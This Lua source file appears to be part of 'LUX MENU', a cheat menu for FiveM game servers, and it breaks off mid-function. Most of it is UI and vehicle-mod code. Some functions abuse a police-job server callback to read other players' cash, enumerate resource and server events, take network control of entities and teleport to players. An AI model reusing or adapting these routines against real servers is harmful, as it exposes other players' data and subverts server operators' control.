print("^1LOADING")

LUX = {}

LUX.Math = {}
LUX.Player = {
	inVehicle = false,
	isNoclipping = false,
}

LUX.Game = {}

local isMenuEnabled = true

-- Globals
-- Menu color customization
local _menuColor = {
    base = { r = 155, g = 89, b = 182, a = 255 },
    highlight = { r = 155, g = 89, b = 182, a = 150 },
    shadow = { r = 96, g = 52, b = 116, a = 150 },
}
-- License key validation for LUX
local _buyer
local _secretKey = "devbuild"
local _gatekeeper = true
local _auth = false

-- Classes
-- > Gatekeeper
Gatekeeper = {}
-- > Tools
Tools = {}

-- Fullscreen Notification builder
local _notifTitle = "~p~LUX MENU"
local _notifMsg = "We must authenticate your license before you proceed"
local _notifMsg2 = "~g~Please enter your unique key code"
local _errorCode = 0

local _blackAmount = 0 
-- Get other player data
function GetPlayerMoney(player)
	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)
		for k,v in ipairs(data.inventory) do
			if v.name == 'cash' then
				_blackAmount =  v.count
				break
			end
		end
	end, player)

	return _blackAmount
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

-- Init variables
local showMinimap = true

-- [NOTE] Weapon Table
local t_Weapons = {
	-- Melee Weapons
	WEAPON_KNIFE = {"Knife", "w_me_knife_01", "mpweaponsunusedfornow", "w_me"},
	WEAPON_NIGHTSTICK = {"Nightstick", "w_me_nightstick", "mpweaponsunusedfornow", "w_me"},
	WEAPON_HAMMER = {"Hammer", "w_me_hammer", "mpweaponsunusedfornow", "w_me"},
	WEAPON_BAT = {"Bat", "w_me_bat", "mpweaponsunusedfornow", "w_me"},
	WEAPON_GOLFCLUB = {"Golf Club", "w_me_gclub", "mpweaponsunusedfornow", "w_me"},
	WEAPON_CROWBAR = {"Crowbar", "w_me_crowbar", "mpweaponsunusedfornow", "w_me"},
	WEAPON_BATTLEAXE = {"Battleaxe", "w_me_fireaxe", "mpweaponsunusedfornow", "w_me"},
	WEAPON_WRENCH = {"Wrench", "w_me_wrench", "mpweaponsunusedfornow", "w_me"},
	WEAPON_BATTLEAXE = {"Battleaxe", "w_me_fireaxe", "mpweaponsunusedfornow", "w_me"},

	-- Handguns
	WEAPON_COMBATPISTOL = {"Combat Pistol", "w_pi_combatpistol", "mpweaponscommon", "w_hg"},
	WEAPON_PISTOL = {"Pistol", "w_pi_pistol", "mpweaponsgang1_small", "w_hg"},
	WEAPON_APPISTOL = {"AP Pistol", "w_pi_apppistol", "mpweaponsgang1_small", "w_hg"},
	WEAPON_STUNGUN = {"Stungun", "w_pi_stungun", "mpweaponsgang0_small", "w_hg"},

	-- Automatic Rifles
	WEAPON_CARBINERIFLE = {"Carbine Rifle", "w_ar_carbinerifle", "mpweaponsgang0_small", "w_ar"},

	-- Shotguns
	WEAPON_PUMPSHOTGUN = {"Pump Shotgun", "w_sg_pumpshotgun", "mpweaponsgang1", "w_sg"},
	WEAPON_SAWNOFFSHOTGUN = {"Sawed Off", "w_sg_sawnoff", "mpweaponsgang1", "w_sg"},

	-- LMG
}


local onlinePlayerSelected = {} -- used for Online Players menu

--Fast Run/Swim Options
HealthCB = {50, 100, 150, 200}
HealthCBWords = {"25%", "50%", "75%", "100%"}
-- Default
SetHealthValue = 200

currFastRunIndex = 1
selFastRunIndex = 4

local _weaponSprite = ""
local colorRed = { r = 231, g = 76, b = 60, a = 255 } -- rgb(231, 76, 60)
local colorGreen = { r = 46, g = 204, b = 113, a = 255 } -- rgb(46, 204, 113)
local colorBlue = { r = 52, g = 152, b = 219, a = 255 } -- rgb(52, 152, 219)
local colorPurple = { r = 155, g = 89, b = 182, a = 255 } -- rgb(155, 89, 182)
-- Set a default menu theme
_menuColor.base = colorPurple

local function KillYourself()
	Citizen.CreateThread(function()
		local playerPed = GetPlayerPed(-1)

		local canSuicide = false
		local foundWeapon = nil

		GiveWeaponToPed(playerPed, GetHashKey("WEAPON_PISTOL"), 250, false, true)

		if HasPedGotWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) then
			if GetAmmoInPedWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) > 0 then
				canSuicide = true
				foundWeapon = GetHashKey('WEAPON_PISTOL')
			end
		end

		if canSuicide then
			if not HasAnimDictLoaded('mp_suicide') then
				RequestAnimDict('mp_suicide')

				while not HasAnimDictLoaded('mp_suicide') do
					Wait(0)
				end
			end

			SetCurrentPedWeapon(playerPed, foundWeapon, true)

			Wait(1000)

			TaskPlayAnim(playerPed, "mp_suicide", "pistol", 8.0, 1.0, -1, 2, 0, 0, 0, 0 )

			Wait(750)

			SetPedShootsAtCoord(playerPed, 0.0, 0.0, 0.0, 0)
			SetEntityHealth(playerPed, 0)
		end
	end)
end

local function VerifyResource(resourceName)
	TriggerEvent(resourceName .. ".verify")
end

local function GetResources()
    local resources = {}
	for i = 1, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

local validResources = {}

RegisterNetEvent("lux.verifyResource")
local resourceListHandler = AddEventHandler("lux.verifyResource", function(resource)
	validResources[#validResources + 1] = resource
end)

for i, v in ipairs(GetResources()) do
	VerifyResource(v)
end

local validResourceEvents = {}
local validResourceServerEvents = {}

RegisterNetEvent("lux.fillEventList")
AddEventHandler("lux.fillEventList", function(resourceName, eventTable)
	validResourceEvents[resourceName] = eventTable
end)

RegisterNetEvent("lux.fillServerEventList")
AddEventHandler("lux.fillServerEventList", function(resourceName, eventTable)
	validResourceServerEvents[resourceName] = eventTable
end)

local function RefreshResourceData()
	for i, v in ipairs(validResources) do 
		TriggerEvent(v .. ".getEvents")
		TriggerEvent(v .. ".getServerEvents")
	end
end

Citizen.CreateThread(function() 

	RefreshResourceData()
	Citizen.Wait(10000)

end)

LUX.Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

function LUX:CheckName(str) 
	if string.len(str) > 16 then
		fmt = string.sub(str, 1, 16)
		return tostring(fmt .. "...")
	else
		return str
	end
end

LUX.Math.Round = function(value, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", value))
end

LUX.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end

LUX.Math.Trim = function(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end

function LUX.Game:GetPlayers()
	local players = {}
	
	for _,player in ipairs(GetActivePlayers()) do
		local ped = GetPlayerPed(player)
		
		if DoesEntityExist(ped) then
			table.insert(players, player)
		end
	end
	
	return players
end

function LUX.Game:GetPlayersInArea(coords, area)
	local players       = LUX.Game:GetPlayers()
	local playersInArea = {}

	for i=1, #players, 1 do
		local target       = GetPlayerPed(players[i])
		local targetCoords = GetEntityCoords(target)
		local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(playersInArea, players[i])
		end
	end

	return playersInArea
end

function LUX.Game:GetPedStatus(playerPed) 

	local inVehicle = IsPedInAnyVehicle(playerPed, false)
	local isIdle = IsPedStill(playerPed)
	local isWalking = IsPedWalking(playerPed)
	local isRunning = IsPedRunning(playerPed)

	if inVehicle then
		return "~o~In Vehicle"

	elseif isIdle then
		return "~o~Idle"

	elseif isWalking then
		return "~o~Walking"

	elseif isRunning then
		return "~o~Jogging"
	
	else
		return "~o~Running"
	end

end

function LUX.Game:GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function LUX.Game:GetSeatPedIsIn(ped)
	if not IsPedInAnyVehicle(ped, false) then return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then return i end
		end
	end
end

function LUX.Game:RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function LUX.Game:TeleportToPlayer(target)
	local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end


-- Config for LSC
LSC = {}
LSC.vehicleMods = {
	{name = "Spoilers", id = 0},
	{name = "Front Bumper", id = 1},
	{name = "Rear Bumper", id = 2},
	{name = "Side Skirt", id = 3},
	{name = "Exhaust", id = 4},
	{name = "Frame", id = 5},
	{name = "Grille", id = 6},
	{name = "Hood", id = 7},
	{name = "Fender", id = 8},
	{name = "Right Fender", id = 9},
	{name = "Roof", id = 10},
	{name = "Vanity Plates", id = 25},
	{name = "Trim", id = 27},
	{name = "Ornaments", id = 28},
	{name = "Dashboard", id = 29},
	{name = "Dial", id = 30},
	{name = "Door Speaker", id = 31},
	{name = "Seats", id = 32},
	{name = "Steering Wheel", id = 33},
	{name = "Shifter Leavers", id = 34},
	{name = "Plaques", id = 35},
	{name = "Speakers", id = 36},
	{name = "Trunk", id = 37},
	{name = "Hydraulics", id = 38},
	{name = "Engine Block", id = 39},
	{name = "Air Filter", id = 40},
	{name = "Struts", id = 41},
	{name = "Arch Cover", id = 42},
	{name = "Aerials", id = 43},
	{name = "Trim 2", id = 44},
	{name = "Tank", id = 45},
	{name = "Windows", id = 46},
	{name = "Livery", id = 48},
	{name = "Horns", id = 14},
	{name = "Wheels", id = 23},
	{name = "Wheel Types", id = "wheeltypes"},
	{name = "Extras", id = "extra"},
	{name = "Neons", id = "neon"},
	{name = "Paint", id = "paint"},
}

LSC.perfMods = {
	{name = "Engine", id = 11},
	{name = "Brakes", id = 12},
	{name = "Transmission", id = 13},
	{name = "Suspension", id = 15},
}

LSC.horns = {
	["HORN_STOCK"] = -1,
	["Truck Horn"] = 1,
	["Police Horn"] = 2,
	["Clown Horn"] = 3,
	["Musical Horn 1"] = 4,
	["Musical Horn 2"] = 5,
	["Musical Horn 3"] = 6,
	["Musical Horn 4"] = 7,
	["Musical Horn 5"] = 8,
	["Sad Trombone Horn"] = 9,
	["Classical Horn 1"] = 10,
	["Classical Horn 2"] = 11,
	["Classical Horn 3"] = 12,
	["Classical Horn 4"] = 13,
	["Classical Horn 5"] = 14,
	["Classical Horn 6"] = 15,
	["Classical Horn 7"] = 16,
	["Scaledo Horn"] = 17,
	["Scalere Horn"] = 18,
	["Salemi Horn"] = 19,
	["Scalefa Horn"] = 20,
	["Scalesol Horn"] = 21,
	["Scalela Horn"] = 22,
	["Scaleti Horn"] = 23,
	["Scaledo Horn High"] = 24,
	["Jazz Horn 1"] = 25,
	["Jazz Horn 2"] = 26,
	["Jazz Horn 3"] = 27,
	["Jazz Loop Horn"] = 28,
	["Starspangban Horn 1"] = 28,
	["Starspangban Horn 2"] = 29,
	["Starspangban Horn 3"] = 30,
	["Starspangban Horn 4"] = 31,
	["Classical Loop 1"] = 32,
	["Classical Horn 8"] = 33,
	["Classical Loop 2"] = 34,

}

LSC.neonColors = {
	["White"] = {255,255,255},
	["Blue"] ={0,0,255},
	["Electric Blue"] ={0,150,255},
	["Mint Green"] ={50,255,155},
	["Lime Green"] ={0,255,0},
	["Yellow"] ={255,255,0},
	["Golden Shower"] ={204,204,0},
	["Orange"] ={255,128,0},
	["Red"] ={255,0,0},
	["Pony Pink"] ={255,102,255},
	["Hot Pink"] ={255,0,255},
	["Purple"] ={153,0,153},
}

LSC.paintsClassic = { -- kill me pls
	{name = "Black", id = 0},
	{name = "Carbon Black", id = 147},
	{name = "Graphite", id = 1},
	{name = "Anhracite Black", id = 11},
	{name = "Black Steel", id = 2},
	{name = "Dark Steel", id = 3},
	{name = "Silver", id = 4},
	{name = "Bluish Silver", id = 5},
	{name = "Rolled Steel", id = 6},
	{name = "Shadow Silver", id = 7},
	{name = "Stone Silver", id = 8},
	{name = "Midnight Silver", id = 9},
	{name = "Cast Iron Silver", id = 10},
	{name = "Red", id = 27},
	{name = "Torino Red", id = 28},
	{name = "Formula Red", id = 29},
	{name = "Lava Red", id = 150},
	{name = "Blaze Red", id = 30},
	{name = "Grace Red", id = 31},
	{name = "Garnet Red", id = 32},
	{name = "Sunset Red", id = 33},
	{name = "Cabernet Red", id = 34},
	{name = "Wine Red", id = 143},
	{name = "Candy Red", id = 35},
	{name = "Hot Pink", id = 135},
	{name = "Pfsiter Pink", id = 137},
	{name = "Salmon Pink", id = 136},
	{name = "Sunrise Orange", id = 36},
	{name = "Orange", id = 38},
	{name = "Bright Orange", id = 138},
	{name = "Gold", id = 99},
	{name = "Bronze", id = 90},
	{name = "Yellow", id = 88},
	{name = "Race Yellow", id = 89},
	{name = "Dew Yellow", id = 91},
	{name = "Dark Green", id = 49},
	{name = "Racing Green", id = 50},
	{name = "Sea Green", id = 51},
	{name = "Olive Green", id = 52},
	{name = "Bright Green", id = 53},
	{name = "Gasoline Green", id = 54},
	{name = "Lime Green", id = 92},
	{name = "Midnight Blue", id = 141},
	{name = "Galaxy Blue", id = 61},
	{name = "Dark Blue", id = 62},
	{name = "Saxon Blue", id = 63},
	{name = "Blue", id = 64},
	{name = "Mariner Blue", id = 65},
	{name = "Harbor Blue", id = 66},
	{name = "Diamond Blue", id = 67},
	{name = "Surf Blue", id = 68},
	{name = "Nautical Blue", id = 69},
	{name = "Racing Blue", id = 73},
	{name = "Ultra Blue", id = 70},
	{name = "Light Blue", id = 74},
	{name = "Chocolate Brown", id = 96},
	{name = "Bison Brown", id = 101},
	{name = "Creeen Brown", id = 95},
	{name = "Feltzer Brown", id = 94},
	{name = "Maple Brown", id = 97},
	{name = "Beechwood Brown", id = 103},
	{name = "Sienna Brown", id = 104},
	{name = "Saddle Brown", id = 98},
	{name = "Moss Brown", id = 100},
	{name = "Woodbeech Brown", id = 102},
	{name = "Straw Brown", id = 99},
	{name = "Sandy Brown", id = 105},
	{name = "Bleached Brown", id = 106},
	{name = "Schafter Purple", id = 71},
	{name = "Spinnaker Purple", id = 72},
	{name = "Midnight Purple", id = 142},
	{name = "Bright Purple", id = 145},
	{name = "Cream", id = 107},
	{name = "Ice White", id = 111},
	{name = "Frost White", id = 112},
}

LSC.paintsMatte = {
	{name = "Black", id = 12},
	{name = "Gray", id = 13},
	{name = "Light Gray", id = 14},
	{name = "Ice White", id = 131},
	{name = "Blue", id = 83},
	{name = "Dark Blue", id = 82},
	{name = "Midnight Blue", id = 84},
	{name = "Midnight Purple", id = 149},
	{name = "Schafter Purple", id = 148},
	{name = "Red", id = 39},
	{name = "Dark Red", id = 40},
	{name = "Orange", id = 41},
	{name = "Yellow", id = 42},
	{name = "Lime Green", id = 55},
	{name = "Green", id = 128},
	{name = "Forest Green", id = 151},
	{name = "Foliage Green", id = 155},
	{name = "Olive Darb", id = 152},
	{name = "Dark Earth", id = 153},
	{name = "Desert Tan", id = 154},
}

LSC.paintsMetal = {
	{name = "Brushed Steel", id = 117},
	{name = "Brushed Black Steel", id = 118},
	{name = "Brushed Aluminum", id = 119},
	{name = "Pure Gold", id = 158},
	{name = "Brushed Gold", id = 159},
}

function LSC:CheckValidVehicleExtras()
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}

	for i=0,50,1 do
		if(DoesExtraExist(playerVeh, i))then
			local realModName = "Extra #"..tostring(i)
			local text = "OFF"
			if(IsVehicleExtraTurnedOn(playerVeh, i))then
				text = "ON"
			end
			local realSpawnName = "extra "..tostring(i)
			table.insert(valid, {
				menuName=realModName,
				data ={
					["action"] = realSpawnName,
					["state"] = text
				}
			})
		end
	end

	return valid
end


function LSC:DoesVehicleHaveExtras(vehicle)
	for i = 1, 30 do
		if ( DoesExtraExist( vehicle, i ) ) then
			return true
		end
	end

	return false
end


function LSC:CheckValidVehicleMods(modID)
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}
	local modCount = GetNumVehicleMods(playerVeh,modID)

	-- Handle Liveries if they don't exist in modCount
	if (modID == 48 and modCount == 0) then

		-- Local to prevent below code running.
		local modCount = GetVehicleLiveryCount(playerVeh)
		for i=1, modCount, 1 do
			local realIndex = i - 1
			local modName = GetLiveryName(playerVeh, realIndex)
			local realModName = GetLabelText(modName)
			local modid, realSpawnName = modID, realIndex

			valid[i] = {
				menuName=realModName,
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			}
		end
	end
	-- Handles all other mods
	for i = 1, modCount, 1 do
		local realIndex = i - 1
		local modName = GetModTextLabel(playerVeh, modID, realIndex)
		local realModName = GetLabelText(modName)
		local modid, realSpawnName = modCount, realIndex


		valid[i] = {
			menuName=realModName,
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		}
	end


	-- Insert Stock Option for modifications
	if(modCount > 0)then
		local realIndex = -1
		local modid, realSpawnName = modID, realIndex
		table.insert(valid, 1, {
			menuName="Stock",
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		})
	end

	return valid
end

------------------------
-- Notification Class --
------------------------

local t
local pow = math.pow
local sin = math.sin
local cos = math.cos
local sqrt = math.sqrt
local abs = math.abs
local asin  = math.asin
-- t = time == how much time has to pass for the tweening to complete
-- b = begin == starting property value
-- c = change == ending - beginning
-- d = duration == running time. How much time has passed *right now*
local cout = function(text) return end

local function outCubic(t, b, c, d)
	t = t / d - 1
	return c * (pow(t, 3) + 1) + b
end

local function inCubic (t, b, c, d)
	t = t / d
	return c * pow(t, 3) + b
end

local function inOutCubic(t, b, c, d)
	t = t / d * 2
	if t < 1 then
		return c / 2 * t * t * t + b
	else
		t = t - 2
		return c / 2 * (t * t * t + 2) + b
	end
end
  
local function outInCubic(t, b, c, d)
	if t < d / 2 then
		return outCubic(t * 2, b, c / 2, d)
	else
		return inCubic((t * 2) - d, b + c / 2, c / 2, d)
	end
end

local notifyBody = {
	-- Text
	scale = 0.35,
	offsetLine = 0.0235, -- text height: 0.019 | newline height: 0.005 or 0.006
	finalPadding = 0.01,
	-- Warp
	offsetX = 0.0525, -- 0.0525
	offsetY = 0.009875, -- 0.01
	-- Sprite
	dict = 'commonmenu',
	sprite = 'header_gradient_script',
	font = 0,
	width = 0.125, 
	height = 0.02325, -- magic 0.8305 -- 0.011625
	heading = 90.0,
	-- Betwenn != notifications
	gap = 0.006,
}

local notifyDefault = {
	text = "Someone forgot to change me!",
	type = 'info',
	timeout = 6000,
	transition = 750,
}

local function NotifyCountLines(v, text)
	BeginTextCommandLineCount("STRING")
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + notifyBody.width / 2)
	AddTextComponentSubstringPlayerName(text)
	local nbrLines = GetTextScreenLineCount(v.x - notifyBody.offsetX, v.y - notifyBody.offsetY)
	return nbrLines
end

local function NotifyMakeRoom(v, from, to, duration, callback)
	Citizen.CreateThread(function()
		local notif = v
		local beginVal = from
		local endVal = to
		local change = endVal - beginVal
	
		local timera = 0
		
		local function SetTimera(a)
			timera = GetGameTimer() - a
		end
		
		local function GetTimera()
			return GetGameTimer() - timera
		end
	
		local compute = true
		SetTimera(0)
		while compute do
			local new_what = outCubic(GetTimera(), beginVal, change, duration)
			if notif.y >= endVal then
				cout('made room done:' .. new_what)
				compute = false
			else
				cout('new: ' .. new_what)
				notif.y = new_what
			end
			Wait(5)
		end
	end)
end

local function NotifyGetResolutionConfiguration()
	SetScriptGfxAlign(string.byte('L'), string.byte('B'))
	local minimapTopX, minimapTopY = GetScriptGfxPosition(-0.0045, 0.002 + (-0.188888))
	ResetScriptGfxAlign()
	
	local w, h = GetActiveScreenResolution()
	
	return { x = minimapTopX, y = minimapTopY }
end

local NotifyTimer = 0

local function NotifyHoldNextNotification(a)
	NotifyTimer = GetGameTimer() - a
end

local function TimeLeft()
	return GetGameTimer() - NotifyTimer
end

local function NotifyCanSendNextNotification()
	return (GetGameTimer() - NotifyTimer) > NotifyTimer
end

local function NotifyPrioritize(v, id, duration) -- Notifications will go above the previous notifications  
	
	if not NotifyCanSendNextNotification() then
		print("Waiting ^3"..duration.."ms ^0to send the next notification...")
		Citizen.Wait(duration)
	end
	
	NotifyHoldNextNotification(duration)
	
	for i = 1, #v do    
		if i ~= id and v[i].draw then
			NotifyMakeRoom(v[i], v[i].y, (v[i].y + (notifyBody.height + ((v[id].lines - 1) * notifyBody.offsetLine))) + notifyBody.finalPadding + notifyBody.gap, duration)
		else
			-- This gets called when id == i
		end
	end 
end

local properties = {
	['default'] = { x = 0.225, y = 0.82, notif = {}, offset = NotifyPrioritize },
}

local sound_type = {
	['success'] = { name = "FocusIn", set = "HintCamSounds" },
	['info'] = { name = "CHALLENGE_UNLOCKED", set = "HUD_AWARDS"},
	['error'] = { name = "CHECKPOINT_MISSED", set = "HUD_MINI_GAME_SOUNDSET"},
}

local draw_type = {
	['success'] = { r = 67, g = 163, b = 110 },
	['info'] = { r = 67, g = 137, b = 163 },
	['error'] = { r = 193, g = 72, b = 72},
}

local function NotifyDrawText(v, text)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + notifyBody.width / 2)
	SetTextColour(255, 255, 255, v.opacity)

	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(v.x - notifyBody.offsetX, v.y - notifyBody.offsetY)
end

local NotifyMinimap = NotifyGetResolutionConfiguration()

local function NotifyDrawBackground(v)
	DrawRect(v.x, v.y + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding) / 2, notifyBody.width, notifyBody.height + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding), 18, 18, 18, v.opacity) --57,55,91
	--DrawSprite(body.dict, body.sprite, v.x, v.y, body.width, body.height, body.heading, 255, 255, 255, v.opacity)
	DrawRect(v.x - 0.060, v.y + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding) / 2, 0.005, notifyBody.height + (((v.lines - 1) * notifyBody.offsetLine) + notifyBody.finalPadding), draw_type[v.type].r, draw_type[v.type].g, draw_type[v.type].b, v.opacity) -- 116, 92, 151
	
	--DrawRect(minimap.x, minimap.y, 0.01, 0.015, 255, 255, 255, v.opacity)
	--DrawSprite(body.dict, body.sprite, v.x - 0.045, v.y, 0.010, 0.04, 0, 255, 255, 255, v.opacity - 50)
end

local function NotifyRecycle(id)

	--local disposeList = {}
	local p = properties['default']

	for i = 1, #p.notif do
		if i ~= id and p.notif[i].dispose then
			p.notif[i] = nil
			-- print("Recycle: ID ^3" .. i .. "^0 was disposed; ^1" .. id .. "^0 -> ^2" .. i)
			return i
		end
	end
end

local function NotifyFormat(inputString, ...)
	local format = string.format
	text = format(inputString, ...)
	return text
end

function drawNotification(options)
	Citizen.CreateThread(function()
		local text = options.text or tostring(options)
		local transition = options.transition or notifyDefault.transition
		local timeout = options.timeout or notifyDefault.timeout
		local type = options.type or notifyDefault.type
		
		local p = properties['default']
	
		local assumeID = #p.notif + 1
	
		local id = NotifyRecycle(assumeID) or assumeID
	
		print("^3-------- Notification " .. id .. " --------")
	
		local sound = sound_type[type]
		local nbrLines = NotifyCountLines(p, text)
	
		local y = 0
		local opacity = 0
	
		p.notif[id] = {
			x = p.x,
			y = 0,
			type = type,
			opacity = 0,
			lines = nbrLines,
			tin = true,
			draw = true,
			tout = false,
		}
		
		if assumeID > 1 then
			p.offset(p.notif, id, transition) --(0.05 * (id - 1)) 
		end
	
		-- Transition In
		Citizen.CreateThread(function()
			local beginVal = 0.0
			local endVal = p.y
			local change = endVal - beginVal
	
	
			local timer = 0
	
			local function SetTimerIn(ms)
				timer = GetGameTimer() - ms
			end
		
			local function GetTimerIn()
				return GetGameTimer() - timer
			end
			
			PlaySoundFrontend(-1, sound.name, sound.set, true)
	
			SetTimerIn(0)
			while p.notif[id].tin do
				local new_y = outCubic(GetTimerIn(), beginVal, change, transition)
				local new_opac = inOutCubic(GetTimerIn(), 0, 255, transition)
				if p.notif[id].y >= endVal then
					cout('done:' .. new_y)
					p.notif[id].tin = false
					return
				else
					cout('y: ' .. new_y)
					cout('opacity: ' .. new_opac)
					p.notif[id].y = new_y
					p.notif[id].opacity = math.floor(new_opac + 0.5)
				end
				Wait(5)
			end
		end)
	
		-- Fade out wait timeout
		Citizen.CreateThread(function()
			Wait(timeout + transition)
			p.notif[id].tout = true
			p.notif[id].beginOut = true
		end)
		
		-- Fade out
		Citizen.CreateThread(function()
			local timer = 0
	
			local function SetTimerOut(ms)
				timer = GetGameTimer() - ms
			end
		
			local function GetTimerOut()
				return GetGameTimer() - timer
			end
	
			while p.notif[id].draw do
				Wait(5)
				while p.notif[id].tout do
					Wait(5)
					if p.notif[id].beginOut then 
						SetTimerOut(0)
						p.notif[id].beginOut = false 
					end
					local opa = inOutCubic(GetTimerOut(), 255, -255, transition)
					if opa <= 0 then
						cout('tout done:' .. math.floor(opa + 0.5))
						p.notif[id].tout = false
						p.notif[id].draw = false
						break
					else
						cout('tout opacity: ' .. opa)
						p.notif[id].opacity = math.floor(opa + 0.5)
					end
				end
			end
		end)
	
		-- Drawing
		Citizen.CreateThread(function()
			while p.notif[id].draw do
				Wait(0)
				NotifyDrawBackground(p.notif[id])
				NotifyDrawText(p.notif[id], text)
			end
	
			-- Schedule notification for garbage collection
			print("Draw complete for ID ^3" .. id)
			print("Marking ID ^3" .. id .. "^0 for garbage collection...")
			p.notif[id].dispose = true
	
		end)


	end)
end

---------------------
--  WarMenu Class  --
---------------------

WarMenu = {}

WarMenu.debug = false

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.20 --0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 4
local buttonScale = 0.375
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local function debugPrint(text)
	if WarMenu.debug then
		Citizen.Trace("[WarMenu] " .. text)
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

-- [NOTE] MenuDrawTitle
local function drawTitle()
	SetScriptGfxDrawOrder(1)

	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2
		if menus[currentMenu].background == "default" then
			RequestStreamedTextureDict("commonmenu")
			if _menuColor.base == colorPurple then
				DrawSprite("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- 255, 76, 60,
			else
